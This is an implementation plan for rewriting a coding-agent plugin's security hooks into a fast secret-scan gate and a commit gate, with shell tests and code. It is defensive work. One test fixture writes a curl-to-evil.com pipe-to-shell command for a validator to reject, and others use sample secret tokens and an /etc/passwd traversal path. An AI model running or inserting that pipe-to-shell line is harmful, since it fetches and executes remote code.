# mypowers v2 Hook Overhaul Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Re-engineer the mypowers hook system from a noisy per-edit three-hook architecture into a fast two-phase design, fixing all 15 known bugs.

**Architecture:** Fast Gate (PreToolUse on Edit|Write|MultiEdit, <50ms, secret scan only) + Commit Gate (PreToolUse on Bash, full posture+scan+attestation pipeline, runs once per commit). Shared `scripts/lib.sh` eliminates duplication.

**Tech Stack:** POSIX sh (#!/bin/sh + set -eu), awk, grep -E, shasum/sha256sum/openssl, git, file command

**Spec:** `docs/superpowers/specs/2026-03-31-mypowers-v2-hook-overhaul-design.md`

---

## File Structure

**Create:**
- `scripts/lib.sh` — shared utilities (~100 lines)
- `hooks/commit-gate/claude-hook.sh` — commit gate hook (~80 lines)
- `hooks/commit-gate/HOOK.md` — documentation
- `tests/test_lib.sh` — lib.sh unit tests
- `tests/test_fast_gate.sh` — fast gate integration tests
- `tests/test_commit_gate.sh` — commit gate integration tests

**Modify:**
- `scripts/scan.sh` — source lib.sh, add patterns, add line cap
- `scripts/attest.sh` — source lib.sh, add --batch mode, atomic writes
- `scripts/posture.sh` — use json_escape from lib.sh for JSON output
- `scripts/bridge-import.sh` — source lib.sh, smarter backtick detection, CRLF normalization
- `hooks/pre-edit-security/claude-hook.sh` — full rewrite to fast gate
- `.claude-plugin/plugin.json` — two PreToolUse entries, no PostToolUse, no PreCompact
- `.codex-plugin/plugin.json` — same structure update
- `templates/codex/hooks.json` — update for commit-gate pattern
- `tests/test_scan.sh` — add new pattern tests, remove post-change-attest wrapper tests
- `tests/test_attest.sh` — add --batch, atomic write, trap cleanup tests
- `tests/test_manifests.sh` — expect new plugin.json structure
- `tests/test_repo_layout.sh` — remove post-change-attest checks, add commit-gate and lib.sh checks
- `tests/test_bridge_import.sh` — add triple-backtick pass, inline code pass, bare command-sub fail
- `tests/test_repo_smoke.sh` — update file lists
- `tests/test_docs_and_agents.sh` — update README section checks

**Delete:**
- `hooks/post-change-attest/` (entire directory: claude-hook.sh, claude-lifecycle.sh, run.sh, HOOK.md)

---

## Task 1: Create scripts/lib.sh + tests/test_lib.sh

**Files:**
- Create: `scripts/lib.sh`
- Create: `tests/test_lib.sh`

- [ ] **Step 1: Write the failing tests**

Create `tests/test_lib.sh` with coverage for: json_escape (plain, double-quote, backslash, newline, tab), extract_json_string (tool_input path, top-level fallback, missing key, escaped quotes), sha256_string (length=64, deterministic), sha256_file (length=64), is_binary_file (text=false, binary=true), resolve_real_path (/tmp roundtrip), posture_cached (miss writes cache, hit reads cache, --refresh forces fresh).

Expected test output: all PASS, 0 failed

- [ ] **Step 2: Run tests to verify they fail (lib.sh does not exist yet)**

```
sh tests/test_lib.sh 2>&1 | head -5
```
Expected: `. scripts/lib.sh: not found` or similar error

- [ ] **Step 3: Create scripts/lib.sh**

Key implementations:

**json_escape** — byte-by-byte via `od -An -tx1`, handles `"`, `\`, `\b`, `\f`, `\n`, `\r`, `\t`, and control chars as `\uXXXX`.

**extract_json_string "$json" "$key"** — awk-based, walks string char-by-char to handle escaped quotes. Tries `tool_input.$key` match area first (finds the key after `"tool_input":{`), then falls back to top-level. Returns empty string on failure; never exits non-zero.

**sha256_file / sha256_string** — try shasum -a 256, then sha256sum, then openssl dgst -sha256 (pipe for string variant).

**resolve_real_path** — try realpath, then readlink -f, then cd+pwd fallback.

**is_binary_file** — try `file --mime-type "$1" | grep -q charset=binary`; fallback: `od -An -tx1 | head -1 | grep -q " 00"`.

**posture_cached [--refresh]** — cache path: `${TMPDIR:-/tmp}/mypowers-posture-$(sha256_string "$project_root")`. On miss or --refresh: run posture.sh --env, write cache. On hit: source cache. On corrupt cache: fallback POSTURE_LEVEL=BASIC.

- [ ] **Step 4: Run tests to verify they pass**

```
sh tests/test_lib.sh
```
Expected: all PASS, 0 failed

- [ ] **Step 5: Commit**

```
git add scripts/lib.sh tests/test_lib.sh
git commit -m "feat: add scripts/lib.sh shared utilities and test_lib.sh"
```

---

## Task 2: Fix scripts/posture.sh JSON output (Bug #9)

**Files:**
- Modify: `scripts/posture.sh`

- [ ] **Step 1: Read posture.sh, locate all JSON string construction sites**

Find every `printf` or `echo` that builds JSON output, note which variables are interpolated without escaping.

- [ ] **Step 2: Write a failing test**

Add to `tests/test_manifests.sh` or inline:
```
# posture.sh --json with a path containing double-quotes produces valid JSON
CLAUDE_PLUGIN_ROOT='/tmp/proj "with quotes"' sh scripts/posture.sh --json | python3 -m json.tool
```
Expected: currently fails with invalid JSON; after fix: valid JSON

- [ ] **Step 3: Source lib.sh and use json_escape**

At top of posture.sh (after `#!/bin/sh`):
```sh
_POSTURE_DIR="$(cd "$(dirname "$0")" && pwd)"
. "$_POSTURE_DIR/lib.sh"
```
Replace all unescaped variable interpolations in JSON output with `$(json_escape "$var")`.

- [ ] **Step 4: Run tests**

```
sh tests/run-all.sh 2>&1 | tail -10
```
Expected: no new failures

- [ ] **Step 5: Commit**

```
git add scripts/posture.sh
git commit -m "fix: use json_escape in posture.sh JSON output mode (bug #9)"
```

---

## Task 3: Update scripts/scan.sh

**Files:**
- Modify: `scripts/scan.sh`
- Modify: `tests/test_scan.sh`

- [ ] **Step 1: Write failing tests for new secret patterns and line cap**

Add to `tests/test_scan.sh`:

```sh
# Slack bot token
printf 'token=xoxb-12345678901-abcdefghijkl\n' > "$tmpf"
result=$(sh scripts/scan.sh "$tmpf" 2>&1); rc=$?
check "slack bot token detected" "non-zero" "$rc"

# Stripe live secret key
printf 'key=sk_live_abcdefghijklmnopqrstu\n' > "$tmpf"
result=$(sh scripts/scan.sh "$tmpf" 2>&1); rc=$?
check "stripe live key detected" "non-zero" "$rc"

# RSA private key header
printf '-----BEGIN RSA PRIVATE KEY-----\n' > "$tmpf"
result=$(sh scripts/scan.sh "$tmpf" 2>&1); rc=$?
check "rsa private key detected" "non-zero" "$rc"

# EC private key header
printf '-----BEGIN EC PRIVATE KEY-----\n' > "$tmpf"
result=$(sh scripts/scan.sh "$tmpf" 2>&1); rc=$?
check "ec private key detected" "non-zero" "$rc"

# Secret beyond 10k lines is NOT scanned
python3 -c "
for i in range(10001): print('safe line')
print('GITHUB_TOKEN=ghp_' + 'a'*36)
" > "$tmpf"
result=$(sh scripts/scan.sh "$tmpf" 2>&1); rc=$?
check "secret beyond 10k lines not caught (line cap)" "0" "$rc"
```

- [ ] **Step 2: Run to verify failures**

```
sh tests/test_scan.sh 2>&1 | grep FAIL
```

- [ ] **Step 3: Update scan.sh**

```sh
# Source lib.sh (at top, after #!/bin/sh)
_SCAN_DIR="$(cd "$(dirname "$0")" && pwd)"
. "$_SCAN_DIR/lib.sh"

# Remove duplicate json_escape definition

# Add patterns (alongside existing GITHUB_TOKEN, AWS, etc.):
# Slack: xox[bpas]-[A-Za-z0-9-]{10,}
# Stripe live: [sr]k_live_[A-Za-z0-9]{20,}
# Private key: -----BEGIN (RSA|EC|OPENSSH )?PRIVATE KEY-----

# In scan loop, add 10k line cap:
#   _line_count=0
#   while IFS= read -r line; do
#     _line_count=$((_line_count + 1))
#     [ "$_line_count" -gt 10000 ] && break
#     ...existing pattern matching...
#   done < "$target_file"
```

- [ ] **Step 4: Run tests**

```
sh tests/test_scan.sh
```
Expected: all PASS

- [ ] **Step 5: Commit**

```
git add scripts/scan.sh tests/test_scan.sh
git commit -m "feat: add Slack/Stripe/private-key patterns and 10k line cap to scan.sh (bugs #8)"
```

---

## Task 4: Update scripts/attest.sh (--batch mode + atomic writes)

**Files:**
- Modify: `scripts/attest.sh`
- Modify: `tests/test_attest.sh`

- [ ] **Step 1: Write failing tests**

```sh
# --batch produces exactly one manifest
tmpdir=$(mktemp -d)
f1="$tmpdir/a.sh"; f2="$tmpdir/b.sh"
printf "echo a\n" > "$f1"; printf "echo b\n" > "$f2"
MYPOWERS_VAULT_DIR="$tmpdir/vault" sh scripts/attest.sh --batch "$f1" "$f2"
count=$(ls "$tmpdir/vault"/pre-commit-*.json 2>/dev/null | wc -l | tr -d " ")
check "--batch: exactly one manifest" "1" "$count"

# manifest key matches format pre-commit-{timestamp}-{4char}.json
name=$(ls "$tmpdir/vault"/pre-commit-*.json | head -1 | xargs basename)
check "manifest key format" "1"   "$(echo "$name" | grep -cE '^pre-commit-[0-9TZ:-]+-[a-z0-9]{4}\.json$' || echo 0)"

# fortress-bible updated exactly once
MYPOWERS_VAULT_DIR="$tmpdir/vault2" MYPOWERS_FORTRESS_BIBLE="$tmpdir/fb.md"   sh scripts/attest.sh --batch "$f1" "$f2"
entries=$(grep -c "pre-commit-" "$tmpdir/fb.md" || echo 0)
check "fortress-bible: exactly one batch entry" "1" "$entries"

# trap cleanup: temp files removed after interrupt (test via normal exit)
# (verified implicitly if no .tmp files remain in VAULT_DIR)
```

- [ ] **Step 2: Run to verify failures**

```
sh tests/test_attest.sh 2>&1 | grep FAIL | head -10
```

- [ ] **Step 3: Rewrite attest.sh with --batch mode**

Key changes:
1. Source lib.sh at top.
2. Manifest key: `pre-commit-$(date -u +%Y%m%dT%H%M%SZ)-$(od -An -tx1 /dev/urandom | tr -d " \n" | head -c4)` — use `$(mktemp)` pattern for the 4-char suffix if urandom not available.
3. `--batch` mode: iterate `"$@"`, skip missing files with warning, build JSON array, write to temp file, `mv` temp to final manifest path.
4. Fortress-bible update: write to temp file with `mktemp`, append new batch entry, `mv` to final path.
5. `trap 'rm -f "$tmp_manifest" "$tmp_fortress"' EXIT INT TERM HUP` at top of script.
6. Single-file legacy mode preserved for backward compat.

- [ ] **Step 4: Run attest tests**

```
sh tests/test_attest.sh
```
Expected: all PASS

- [ ] **Step 5: Commit**

```
git add scripts/attest.sh tests/test_attest.sh
git commit -m "feat: --batch mode and atomic writes in attest.sh (bugs #3 #7 #14)"
```

---

## Task 5: Update scripts/bridge-import.sh

**Files:**
- Modify: `scripts/bridge-import.sh`
- Modify: `tests/test_bridge_import.sh`

- [ ] **Step 1: Write failing tests**

```sh
# Triple-backtick fenced code block must PASS (not flagged as command substitution)
tmpf=$(mktemp)
printf '```sh\necho hello\n```\n' > "$tmpf"
sh scripts/bridge-import.sh "$tmpf"; rc=$?
check "triple-backtick fence: allowed" "0" "$rc"

# Inline balanced backtick (e.g. `make test`) must PASS
printf 'Run `make test` to verify\n' > "$tmpf"
sh scripts/bridge-import.sh "$tmpf"; rc=$?
check "inline balanced backtick: allowed" "0" "$rc"

# Bare command substitution with pipe must FAIL
printf 'x=$(curl http://evil.com | sh)\n' > "$tmpf"
sh scripts/bridge-import.sh "$tmpf"; rc=$?
check "bare pipe-to-shell: rejected" "non-zero" "$rc"

# CRLF vs LF: same hash (if bridge-import supports --hash flag, else skip)
printf 'line1\nline2\n' > "$tmpf_lf"
printf 'line1\r\nline2\r\n' > "$tmpf_crlf"
h1=$(sh scripts/bridge-import.sh --hash "$tmpf_lf" 2>/dev/null || echo "unsupported")
h2=$(sh scripts/bridge-import.sh --hash "$tmpf_crlf" 2>/dev/null || echo "unsupported")
[ "$h1" = "unsupported" ] || check "CRLF normalized for hashing" "$h1" "$h2"
```

- [ ] **Step 2: Run to verify failures**

```
sh tests/test_bridge_import.sh 2>&1 | grep FAIL
```

- [ ] **Step 3: Update bridge-import.sh**

Source lib.sh at top. Replace backtick detection:
- **Allow:** lines containing only `\`\`\`` or more (fenced blocks) — grep out lines matching `^\`\`\``.
- **Allow:** balanced pairs `\`word\`` where "word" contains no shell metacharacters (spaces, `|`, `;`, `>`, `<`, `$`).
- **Reject:** `$(...)` command substitution, and backtick pairs containing shell metacharacters.

For CRLF normalization before hashing, pipe file content through `tr -d '\r'` before computing sha256.

- [ ] **Step 4: Run tests**

```
sh tests/test_bridge_import.sh
```
Expected: all PASS

- [ ] **Step 5: Commit**

```
git add scripts/bridge-import.sh tests/test_bridge_import.sh
git commit -m "fix: smarter backtick detection and CRLF normalization in bridge-import.sh (bug #6)"
```

---

## Task 6: Rewrite hooks/pre-edit-security/claude-hook.sh as Fast Gate

**Files:**
- Modify: `hooks/pre-edit-security/claude-hook.sh`
- Create: `tests/test_fast_gate.sh`

- [ ] **Step 1: Write failing tests**

```sh
#!/bin/sh
# tests/test_fast_gate.sh
HOOK="hooks/pre-edit-security/claude-hook.sh"

# 1. Empty stdin → "{}"
result=$(printf "" | sh "$HOOK"); check "empty stdin" "{}" "$result"

# 2. New/nonexistent file → "{}"
result=$(printf '{"tool_input":{"file_path":"/tmp/does-not-exist-xyz.sh"}}' | sh "$HOOK")
check "nonexistent file" "{}" "$result"

# 3. Clean existing file → "{}"
tmpf=$(mktemp); printf "echo hello\n" > "$tmpf"
result=$(printf '{"tool_input":{"file_path":"%s"}}' "$tmpf" | sh "$HOOK")
check "clean file: silent allow" "{}" "$result"; rm -f "$tmpf"

# 4. File with GITHUB_TOKEN → block decision
tmpf=$(mktemp); printf 'GITHUB_TOKEN=ghp_%s\n' "$(python3 -c "print('a'*36)")" > "$tmpf"
result=$(printf '{"tool_input":{"file_path":"%s"}}' "$tmpf" | sh "$HOOK")
check "secret file: decision block present" "1" "$(echo "$result" | grep -c decision || echo 0)"
rm -f "$tmpf"

# 5. Path traversal → block
result=$(printf '{"tool_input":{"file_path":"/tmp/../etc/passwd"}}' | sh "$HOOK")
check "path traversal: blocked" "1" "$(echo "$result" | grep -cE "block|traversal" || echo 0)"

# 6. Malformed JSON (non-empty) → parser_warning
result=$(printf "not{{json" | sh "$HOOK")
check "malformed JSON: parser_warning" "1" "$(echo "$result" | grep -c parser_warning || echo 0)"

# 7. Binary file → "{}" (skip scan)
tmpb=$(mktemp); printf "\x00\x01\x02binary" > "$tmpb"
result=$(printf '{"tool_input":{"file_path":"%s"}}' "$tmpb" | sh "$HOOK")
check "binary file: silent allow" "{}" "$result"; rm -f "$tmpb"
```

- [ ] **Step 2: Run to verify failures with current hook**

```
sh tests/test_fast_gate.sh 2>&1 | grep FAIL
```

- [ ] **Step 3: Rewrite hooks/pre-edit-security/claude-hook.sh**

Complete rewrite to ~50 lines:

```sh
#!/bin/sh
# pre-edit-security/claude-hook.sh — Fast Gate
# PreToolUse: Edit|Write|MultiEdit | timeout: 5s
# One job: detect hardcoded secrets before editing. Silent on success. Deny on find.
set -eu
_HOOK_DIR="$(cd "$(dirname "$0")" && pwd)"
_PLUGIN_ROOT="$(cd "$_HOOK_DIR/../.." && pwd)"
. "$_PLUGIN_ROOT/scripts/lib.sh"

payload="$(cat)"

# 1. Empty stdin → allow silently
[ -z "$payload" ] && printf "{}" && exit 0

# 2. Extract file_path
file_path="$(extract_json_string "$payload" "file_path")"

# 3. Present but unextractable → parser_warning
if [ -z "$file_path" ]; then
  printf '{"hookSpecificOutput":{"parser_warning":"could not extract file_path"}}'
  exit 0
fi

# 4. Path traversal check
case "$file_path" in
  */../*|*/..)
    printf '{"decision":"block","reason":"%s"}'       "$(json_escape "path traversal rejected: $file_path")"
    exit 0 ;;
esac

# 5. Nonexistent file (new file creation) → allow silently
[ ! -f "$file_path" ] && printf "{}" && exit 0

# 6. Resolve and validate path
resolved="$(resolve_real_path "$file_path")"
case "$resolved" in
  /dev/*|/proc/*|/sys/*)
    printf '{"decision":"block","reason":"%s"}'       "$(json_escape "path outside allowed area: $resolved")"
    exit 0 ;;
esac

# 7. Binary file → skip scan, allow silently
is_binary_file "$resolved" && printf "{}" && exit 0

# 8. Secret scan (10k line cap inside scan.sh)
"$_PLUGIN_ROOT/scripts/scan.sh" "$resolved" >/dev/null 2>/tmp/mypowers-scan-err && {
  printf "{}"  # clean
} || {
  reason="$(cat /tmp/mypowers-scan-err 2>/dev/null || echo "secret detected")"
  printf '{"decision":"block","reason":"%s"}' "$(json_escape "$reason")"
}
rm -f /tmp/mypowers-scan-err
```

- [ ] **Step 4: Run fast gate tests**

```
sh tests/test_fast_gate.sh
```
Expected: all PASS

- [ ] **Step 5: Run full suite (no regressions)**

```
sh tests/run-all.sh 2>&1 | tail -10
```

- [ ] **Step 6: Commit**

```
git add hooks/pre-edit-security/claude-hook.sh tests/test_fast_gate.sh
git commit -m "feat: rewrite pre-edit hook as fast gate — fixes new-file blocking and latency (bugs #1 #2 #5 #11)"
```

---

## Task 7: Create hooks/commit-gate/ (Commit Gate + tests)

**Files:**
- Create: `hooks/commit-gate/claude-hook.sh`
- Create: `hooks/commit-gate/HOOK.md`
- Create: `tests/test_commit_gate.sh`

- [ ] **Step 1: Write failing tests**

```sh
#!/bin/sh
# tests/test_commit_gate.sh
HOOK="hooks/commit-gate/claude-hook.sh"

# 1. Empty stdin → "{}"
result=$(printf "" | sh "$HOOK")
check "empty stdin: silent allow" "{}" "$result"

# 2. Non-git Bash command → "{}"
result=$(printf '{"tool_input":{"command":"ls -la /tmp"}}' | sh "$HOOK")
check "non-git command: passthrough" "{}" "$result"

# 3. git rebase → allow with coverage note containing "rebase"
result=$(printf '{"tool_input":{"command":"git rebase main"}}' | sh "$HOOK")
check "git rebase: has rebase note" "1"   "$(echo "$result" | grep -c rebase || echo 0)"

# 4. Malformed JSON → parser_warning
result=$(printf "not{{json" | sh "$HOOK")
check "malformed JSON: parser_warning" "1"   "$(echo "$result" | grep -c parser_warning || echo 0)"

# 5. git commit patterns recognized (in non-repo context: no files → allow with note, not crash)
for cmd in   "git commit -m msg"   "git commit --amend"   "git commit -am msg"   "git commit -- path/file.sh"   "git push origin main"   "git merge feature"; do
  result=$(printf '{"tool_input":{"command":"%s"}}' "$cmd" | sh "$HOOK" 2>/dev/null)
  check "no crash for: $cmd" "1" "$(echo "$result" | grep -cE "." || echo 0)"
done

# 6. manifest key format after real commit scan
# (integration test — requires git repo with staged file)
# Skip if not in git repo with staged changes
if git diff --cached --name-only 2>/dev/null | grep -q .; then
  tmpvault=$(mktemp -d)
  MYPOWERS_VAULT_DIR="$tmpvault"     printf '{"tool_input":{"command":"git commit -m test"}}' | sh "$HOOK" >/dev/null 2>&1
  count=$(ls "$tmpvault"/pre-commit-*.json 2>/dev/null | wc -l | tr -d " ")
  check "one manifest per commit-gate invocation" "1" "$count"
  rm -rf "$tmpvault"
fi
```

- [ ] **Step 2: Run to verify failures (hook does not exist)**

```
sh tests/test_commit_gate.sh 2>&1 | head -5
```
Expected: hook not found error

- [ ] **Step 3: Create hooks/commit-gate/claude-hook.sh (~80 lines)**

Structure:
1. Source lib.sh
2. Read stdin; empty → `{}`
3. extract_json_string for "command"; empty → parser_warning
4. classify_git_command() function → returns: none | commit | amend | push | merge | cherry-pick | rebase
5. none → `{}`; rebase → allow with additionalContext note
6. `git -C "$_PLUGIN_ROOT" rev-parse --git-dir` check; not repo → `{}`
7. discover_files() per flow tier (see spec coverage table)
8. No files → allow with additionalContext coverage note
9. Warn if >50 files
10. posture_cached --refresh
11. Scan loop with early exit on failure
12. `attest.sh --batch` (fire-and-forget, `|| true`)
13. Allow with additionalContext: coverage tier + posture level + file count

- [ ] **Step 4: Create hooks/commit-gate/HOOK.md**

Brief doc covering: what it does, when it fires, coverage tier table (Full/Best-effort/Excluded), timeout, manifest key format.

- [ ] **Step 5: Run commit gate tests**

```
sh tests/test_commit_gate.sh
```
Expected: all PASS

- [ ] **Step 6: Commit**

```
git add hooks/commit-gate/ tests/test_commit_gate.sh
git commit -m "feat: create commit-gate hook with tiered git coverage (bugs #2 #3 #4 #7)"
```

---

## Task 8: Delete post-change-attest/ + Update plugin manifests

**Files:**
- Delete: `hooks/post-change-attest/`
- Modify: `.claude-plugin/plugin.json`
- Modify: `.codex-plugin/plugin.json` (if exists)
- Modify: `templates/codex/hooks.json` (if exists)

- [ ] **Step 1: Read current plugin.json files**

Read `.claude-plugin/plugin.json` and `.codex-plugin/plugin.json` (if exists) to confirm current structure.

- [ ] **Step 2: Update .claude-plugin/plugin.json**

Replace with two-hook structure:
```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Edit|Write|MultiEdit",
        "hooks": [{
          "type": "command",
          "command": "sh \"${CLAUDE_PLUGIN_ROOT}/hooks/pre-edit-security/claude-hook.sh\"",
          "timeout": 5,
          "statusMessage": "mypowers secret scan"
        }]
      },
      {
        "matcher": "Bash",
        "hooks": [{
          "type": "command",
          "command": "sh \"${CLAUDE_PLUGIN_ROOT}/hooks/commit-gate/claude-hook.sh\"",
          "timeout": 30,
          "statusMessage": "mypowers commit gate"
        }]
      }
    ]
  }
}
```

- [ ] **Step 3: Update .codex-plugin/plugin.json and templates/codex/hooks.json if they exist**

Same structure, adapted for Codex hook syntax if different.

- [ ] **Step 4: Delete hooks/post-change-attest/**

```
git rm -r hooks/post-change-attest/
```

- [ ] **Step 5: Run test_manifests.sh and test_repo_layout.sh**

Update assertions as needed (expect new structure, not old), then run:
```
sh tests/test_manifests.sh && sh tests/test_repo_layout.sh
```

- [ ] **Step 6: Commit**

```
git add .claude-plugin/plugin.json
git rm -r hooks/post-change-attest/
git commit -m "feat: two-phase plugin manifest, delete post-change-attest (bugs #4 #5 #12)"
```

---

## Task 9: Update Remaining Tests

**Files:**
- Modify: `tests/test_manifests.sh`
- Modify: `tests/test_repo_layout.sh`
- Modify: `tests/test_repo_smoke.sh`
- Modify: `tests/test_docs_and_agents.sh`

- [ ] **Step 1: Run full test suite to see what breaks after Task 8**

```
sh tests/run-all.sh 2>&1 | grep -E "FAIL|ERROR"
```

- [ ] **Step 2: Update test_manifests.sh**

- Remove: checks for PostToolUse hook, PreCompact hook
- Add: check that PreToolUse has exactly 2 entries (Edit|Write|MultiEdit matcher AND Bash matcher)
- Add: check that no PostToolUse key exists in plugin.json
- Add: check commit-gate timeout is 30, fast-gate timeout is 5

- [ ] **Step 3: Update test_repo_layout.sh**

- Remove: assertions checking `hooks/post-change-attest/` exists
- Add: assertions that `hooks/commit-gate/claude-hook.sh` exists
- Add: assertions that `hooks/commit-gate/HOOK.md` exists
- Add: assertion that `scripts/lib.sh` exists

- [ ] **Step 4: Update test_repo_smoke.sh**

- Remove: post-change-attest files from expected-present list
- Add: `scripts/lib.sh`, `hooks/commit-gate/claude-hook.sh`, `hooks/commit-gate/HOOK.md`

- [ ] **Step 5: Update test_docs_and_agents.sh**

- Update README section heading checks to match new hook documentation structure

- [ ] **Step 6: Run full suite — all pass**

```
sh tests/run-all.sh
```
Expected: 0 failures

- [ ] **Step 7: Commit**

```
git add tests/
git commit -m "test: update test suite for v2 hook structure"
```

---

## Task 10: Update README + Final Verification

**Files:**
- Modify: `README.md`

- [ ] **Step 1: Update README hook documentation section**

Replace old three-hook description with:

**Two-Phase Security Hook System**
- **Fast Gate** (PreToolUse: Edit|Write|MultiEdit, 5s timeout): Scans target file for hardcoded secrets before each edit. Silent on clean files. Blocks on secret detection. No posture check. No attestation. Allows new files immediately.
- **Commit Gate** (PreToolUse: Bash, 30s timeout): Runs the full pipeline once when Claude runs a commit-producing git command. Discovers staged/modified files, scans for secrets, attests clean files, updates fortress-bible.md atomically.

Include git flow coverage table (same as spec).

- [ ] **Step 2: Run final full test suite**

```
sh tests/run-all.sh
```
Expected: all pass, 0 failures

- [ ] **Step 3: Verify post-change-attest references are gone**

```
grep -r "post-change-attest" . --include="*.sh" --include="*.json" --include="*.md" | grep -v ".git/"
```
Expected: no output

- [ ] **Step 4: Verify lib.sh is sourced in all six scripts**

```
for f in scripts/scan.sh scripts/attest.sh scripts/posture.sh scripts/bridge-import.sh \
  hooks/pre-edit-security/claude-hook.sh hooks/commit-gate/claude-hook.sh; do
  grep -l "lib.sh" "$f" && echo "OK: $f" || echo "MISSING: $f"
done
```
Expected: all OK

- [ ] **Step 5: Commit**

```
git add README.md
git commit -m "docs: update README for v2 two-phase hook architecture"
```

---

## Bug Fix Verification Checklist

After all 10 tasks complete, verify each of the 15 bugs is addressed:

- [ ] Bug #1: New file writes no longer blocked (fast gate allows if `! -f "$file_path"`)
- [ ] Bug #2: Posture cached per session via posture_cached in lib.sh (fast gate skips posture entirely)
- [ ] Bug #3: One manifest per commit-gate invocation keyed by `pre-commit-{timestamp}-{rand4}`
- [ ] Bug #4: PostToolUse hook deleted; no per-edit attestation
- [ ] Bug #5: Fast gate 5s timeout, commit gate 30s (was 20s each = 40s total per edit)
- [ ] Bug #6: Triple-backtick and balanced inline backticks allowed in bridge-import.sh
- [ ] Bug #7: Fortress-bible atomic mv from temp with trap cleanup
- [ ] Bug #8: json_escape defined once in lib.sh, sourced everywhere
- [ ] Bug #9: posture.sh JSON mode uses json_escape from lib.sh
- [ ] Bug #10: eval of posture.sh output replaced with posture_cached sourcing (1 site vs 4)
- [ ] Bug #11: Fast gate returns `{}` on clean — no context message injection
- [ ] Bug #12: PreCompact hook removed
- [ ] Bug #13: sed-based JSON parsing replaced with awk-based extract_json_string in lib.sh
- [ ] Bug #14: attest.sh has trap cleanup for temp files
- [ ] Bug #15: Path traversal (`..`) rejected after normalization in fast gate
